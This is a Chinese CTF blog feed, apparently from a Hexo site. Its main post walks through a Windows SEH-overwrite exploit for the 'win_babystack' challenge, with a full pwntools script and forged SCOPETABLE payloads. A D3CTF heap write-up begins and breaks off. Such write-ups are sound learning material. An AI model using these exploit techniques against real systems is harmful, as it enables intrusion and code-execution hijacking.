EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">    <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">      <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们主要劫持long (*FilterFunc)();</p><p>关于如何选择存储信息来判断代码的正确性，下面则是选择逻辑。</p><p>说实话，直接看的有点生硬，还是结合题目来理解。</p><p>例子就是这道win_babystack</p><p>题目链接:<a href="babystack.zip">babystack.zip</a></p><p><img src="1.png" alt="image-20200207120145189"></p><p>这一道题最初给了main函数地址和stack地址。</p><p>大大降低了我们难度。</p><p>然后这下面还有任意地址泄露，说明确实是个baby题</p><p><img src="2.png" alt="image-20200207120434082"></p><p>然后漏洞在这里</p><p><img src="3.png" alt="image-20200207120606732"></p><p>这里通过v9输入，我们能控制seh在栈上的布局，从而劫持程序流程。</p><p>具体利用方式在于控制栈上seh的结构体。</p><p>我们首先来分析一下栈上的有哪些seh的值。</p><p><img src="5.png" alt="image-20200207122626305"></p><p>图中，1的值是返回地址，2是ebp，3是security_cookie^scopetable_address的值。在程序中存放security_cookie的位置是固定的，这位置是在data段，但是值不固定。</p><p><img src="6.png" alt="image-20200207122910795"></p><p>我们这里知道了main函数的地址，则我们可以通过泄露将security_cookie给泄露出来。</p><p>然后我们还要泄露Next的值，很多个异常处理块都是通过下图来连接在一块，这个Next的值是在栈上的，ebp-0x1c的地方，我们要修改scopetable_address，是一定会将这个地方覆盖的，但是我们程序会检查Next的值，所以我们要将这个地方泄露出来，然后原封不动的写回去。</p><p><img src="7.png" alt="img"></p><p>说到这里，给的链接上面也讲的挺详细的，我这里就讲讲这些文章我看的比较迷糊的地方</p><p>先研究一下其他博客的exp吧，毕竟我也是学着别人的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'192.168.80.133'</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Do you want to know more?'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">    sh.sendline(str(addr))</span><br><span class="line">    sh.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">    <span class="keyword">return</span> int(sh.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'stack address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">stack_addr = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'stack_addr: '</span> + hex(stack_addr))</span><br><span class="line">sh.recvuntil(<span class="string">'main address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">main_address = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'main_address: '</span> + hex(main_address))</span><br><span class="line"></span><br><span class="line">security_cookie = get_value(main_address + <span class="number">12116</span>)</span><br><span class="line">log.success(<span class="string">'security_cookie: '</span> + hex(security_cookie))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sh.sendline(<span class="string">'n'</span>)</span><br><span class="line">next_addr = stack_addr + <span class="number">212</span></span><br><span class="line">log.success(<span class="string">'next_addr: '</span> + hex(next_addr))</span><br><span class="line"><span class="comment">#这上面的都是在泄露，没啥好看的</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment">#这上面就是我们要伪造的SCOPETABLE</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">sh.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>其实这个exp大部分很好懂，当时我卡了很久的地方就是payload的构造部分，相信你们也看到了，不同文章的payload不同。我们先对比两个不一样的payload吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload1</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload2</span></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span><span class="number">-4</span>,<span class="string">"x22"</span>)+p32(ebp^___security_cookie_value)+<span class="string">"b"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">944</span>)+p32((stack_addr+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>对比发现两个payload大同小异，区别是ebp^security_cookie的地方不一样。起初我以为没有关系，但是我乱放之后直接导致程序崩溃。</p><p>然后我仔细分析了一下，这个ebp^security_cookie存放的地方和伪造的SCOPETABLE有关系。</p><p>当我们触发异常后，程序会调用se的处理程序，也就是ebp-0x10的地方所指向的地方，这里是不能劫持的，劫持后程序会崩溃，不信可以试试。然后我们到ebp-0x10的这个地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401460                 push    ebp</span><br><span class="line">.text:00401461                 mov     ebp, esp</span><br><span class="line">.text:00401463                 push    [ebp+arg_C]</span><br><span class="line">.text:00401466                 push    [ebp+arg_8]</span><br><span class="line">.text:00401469                 push    [ebp+arg_4]</span><br><span class="line">.text:0040146C                 push    [ebp+arg_0]</span><br><span class="line">.text:0040146F                 push    offset @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401474                 push    offset ___security_cookie</span><br><span class="line">.text:00401479                 call    _except_handler4_common</span><br><span class="line">.text:0040147E                 add     esp, 18h</span><br><span class="line">.text:00401481                 pop     ebp</span><br><span class="line">.text:00401482                 retn</span><br></pre></td></tr></table></figure><p>这个地方调用了_except_handler4_common</p><p>分析一下_except_handler4_common</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重点关注的是那个验证GS的函数，将取出来的scopeTable,当作参数传入了ValidateLocalCookies，然后将ebp传入ValidateLocalCookies。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v3; // esi@2</span><br><span class="line">    unsigned int v4; // esi@3</span><br><span class="line"></span><br><span class="line">    if ( scopeTable-&gt;GSCookieOffset != -2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码首先会判断scopeTable-&gt;GSCookieOffset 也就是scopeTable的第一个值是不是0x0FFFFFFFE，如果是着会去取scopeTable-&gt;EHCookieOffset的值作为偏移，然后ebp为数组地址，取出数组的值。然后再取出scopeTable-&gt;EHCookieXOROffset为索引的值异或。然后判断结果是不是security_cookie。同理，如果不是，则会使用scopeTable-&gt;GSCookieOffset和scopeTable-&gt;GSCookieXOROffset为索引的值异或，最后判断结果是不是security_cookie。</p><p>这里我们就很好伪造了，通常我们会让GSCookieXOROffset和EHCookieOffset为0。然后这个时候数组的值就是ebp了，然后我们伪造gs为，ebp^security就可以了。然后这个值在哪就通过先判断scopeTable-&gt;GSCookieOffset是不是-2,如果是-2,则存放的地方就是scopeTable-&gt;GSCookieOffset来决定的。如果不是-2，则是EHCookieOffset来决定。</p><p>说到这里，结构体就已经伪造完毕，用第一个payload或者第二个payload都可以，因为他们使用的方式不同。</p><p>伪造的结构体存放在哪里都可以，但是要确保，ebp-0x8的地方存放的是伪造的结构体的地址异或security_cookie的值。像payload1和payload2都是存放再栈上。</p><p>到这里所以我个人觉得含糊的地方都讲清楚了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;武汉加油！湖北加油！&lt;/p&gt;
&lt;p&gt;被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。&lt;/p&gt;
&lt;p&gt;这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体。&lt;/p&gt;
&lt;p&gt;先给大家推荐两篇文章吧，我就是照着这两篇文章学习的，这里只是
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="win_pwn" scheme="http://Whali3n51.github.io/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>新年快乐</title>
    <link href="http://whali3n51.github.io/2020/01/01/happy-new-year/"/>
    <id>http://whali3n51.github.io/2020/01/01/happy-new-year/</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2020-02-08T14:22:56.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="祝大家新的一年心想事成"><a href="#祝大家新的一年心想事成" class="headerlink" title="祝大家新的一年心想事成"></a>祝大家新的一年心想事成</h1><p>2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。2019年大概是我这二十年以来过的最精彩的一年了。2019年也时我技术突飞猛涨的一年。想想去年这个时候，我还啥也不会，到了今年，却已经去各个地方比赛。在新的一年里，祝大家技术突飞猛进，心想事成，烦恼走开，赶快脱单。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;祝大家新的一年心想事成&quot;&gt;&lt;a href=&quot;#祝大家新的一年心想事成&quot; class=&quot;headerlink&quot; title=&quot;祝大家新的一年心想事成&quot;&gt;&lt;/a&gt;祝大家新的一年心想事成&lt;/h1&gt;&lt;p&gt;2019年过去了，2019发生了许多许多的事，每件事都让我挺难忘了。
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="新年快乐" scheme="http://Whali3n51.github.io/tags/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>浅尝多线程pwn</title>
    <link href="http://whali3n51.github.io/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    <id>http://whali3n51.github.io/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/</id>
    <published>2019-12-11T13:48:20.000Z</published>
    <updated>2020-02-08T14:22:28.949Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b5f6f3f49f00594822848e0b76c7499109b5c8bdb953da7f5ffe815d3c6c2389">7f854dae60f2b3cbfe1054663f1fc2f0fd5c07831dfe5fcb9658b878fdf977a3a63352efe928c0bfea970d322d70cdfad6f5185b0a40975bb6defc70015bdaf31f01cbd0df57d8d10b6773fca330d71a53ab58582e830adcb71d9332ef878cf47af961f0c21de81ddbd94c538dc66edcea247cdef87f124652ef7cd2bb29105989a50dfd9b258cf0330880065c78da1ba5b390d33e5a7db8554be543ce2356d235859f84b7e36d9cc1cc547871072382efcd3a338c21c68c47c9f66e3aea28c0498c4c989f730fabb195921bffb9fe985412169d68e1a10db894cdde895d5ec9f797c31068141875fcaf214012c2b44bd854cd33637ce90070faac02459e36ca8ba82d9b5939e12ce987f382ad998f7735b991a0d6f86015b0389383e96e75cfe87edbda8258f1dcfb1d6a4060a618a11b7e60e24c90247e14f0b423815a73c10bbfa1133c44178b79e02b4fdde87ec15ff29ada93cd21655773686b1133371ae9b3447a2824213e53aa9f29675bf10f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="多线程pwn" scheme="http://Whali3n51.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF_new_heap复现</title>
    <link href="http://whali3n51.github.io/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/"/>
    <id>http://whali3n51.github.io/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:21:26.604Z</updated>
    
    <content type="html"><![CDATA[<p>D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。</p><p>首先我们来看一下这一题开启的保护和使用的libc版本</p><p>题目附件:<a href="./new_heap_update.zip">new_heap_update.zip</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whalien51@ubuntu:~/new_heap-updated$ strings libc.so.6 |grep GLIBC</span><br><span class="line">GLIBC_2.29</span><br></pre></td></tr></table></figure><p>这一题使用的libc2.29。</p><p>直接IDA源码分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_C33</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"good present for African friends:0x%x\n"</span>, ((ptr &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里发现没有setbuf(stdin,0)。意思是这里会为getchar()输入开辟一个很大的堆块形成缓冲区。</p><p>然后再读源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_C33();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C08();</span><br><span class="line">      v3 = sub_BB9();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_B42();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"sure?"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( getchar() == <span class="string">'y'</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_A60();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现getchar()那里可以一直往缓冲区输入数值。</p><p>这个是漏洞之一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B42</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = sub_BB9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index out of range"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(qword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在uaf，第二个漏洞。</p><p>然后看创建堆块函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span 